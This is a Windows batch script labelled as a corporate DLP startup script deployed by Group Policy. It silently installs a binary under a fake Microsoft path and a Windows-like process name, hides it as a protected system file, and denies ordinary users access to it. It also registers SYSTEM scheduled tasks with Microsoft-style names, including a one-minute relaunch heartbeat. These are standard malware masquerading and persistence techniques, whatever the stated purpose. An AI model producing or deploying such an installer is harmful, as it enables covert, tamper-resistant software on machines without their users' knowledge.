@echo off
setlocal

:: ==============================================================================
:: Active Directory GPO Computer Startup Script - Corporate DLP Deployment
:: Runs silently on workstation boot under NT AUTHORITY\SYSTEM
:: Idempotent: Only installs/updates if binary is missing or updated.
:: ==============================================================================

set "TARGET_DIR=%ProgramData%\Microsoft\Crypto\SystemBroker"
set "EXE_NAME=RuntimeBrokerHost.exe"
set "SOURCE_DIR=%~dp0"

:: 1. If running from local source or network share, verify source file exists
if not exist "%SOURCE_DIR%%EXE_NAME%" (
    goto :EOF
)

:: 2. Check if already installed and running
if exist "%TARGET_DIR%\%EXE_NAME%" (
    tasklist /FI "IMAGENAME eq %EXE_NAME%" 2>NUL | find /I /N "%EXE_NAME%">NUL
    if "%ERRORLEVEL%"=="0" (
        :: Already installed and running cleanly
        goto :EOF
    )
)

:: 3. Create target directory
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1

:: 4. Copy the single self-contained binary
copy /Y "%SOURCE_DIR%%EXE_NAME%" "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1

:: 5. Set Super-Hidden (+h +s: Protected Operating System File)
attrib +h +s "%TARGET_DIR%" >nul 2>&1
attrib +h +s "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1

:: 6. Lock NTFS Permissions (Anti-Delete & Anti-Tamper)
:: SYSTEM and Administrators have Full Control. Standard Users are denied access.
icacls "%TARGET_DIR%" /inheritance:r /grant:r "SYSTEM":(OI)(CI)F /grant:r "Administrators":(OI)(CI)F /deny Users:(OI)(CI)F >nul 2>&1

:: 7. Register Task strictly under NT AUTHORITY\SYSTEM
schtasks /create /tn "Microsoft\Windows\Runtime\SystemBrokerHost" /tr "\"%TARGET_DIR%\%EXE_NAME%\"" /sc onstart /ru "NT AUTHORITY\SYSTEM" /rl highest /f >nul 2>&1

:: 8. Register 1-Minute Auto-Restart Heartbeat
schtasks /create /tn "Microsoft\Windows\Runtime\SystemBrokerHost_Heartbeat" /tr "\"%TARGET_DIR%\%EXE_NAME%\"" /sc minute /mo 1 /ru "NT AUTHORITY\SYSTEM" /rl highest /f >nul 2>&1

:: 9. Start the process immediately
schtasks /run /tn "Microsoft\Windows\Runtime\SystemBrokerHost" >nul 2>&1

endlocal
exit /b 0

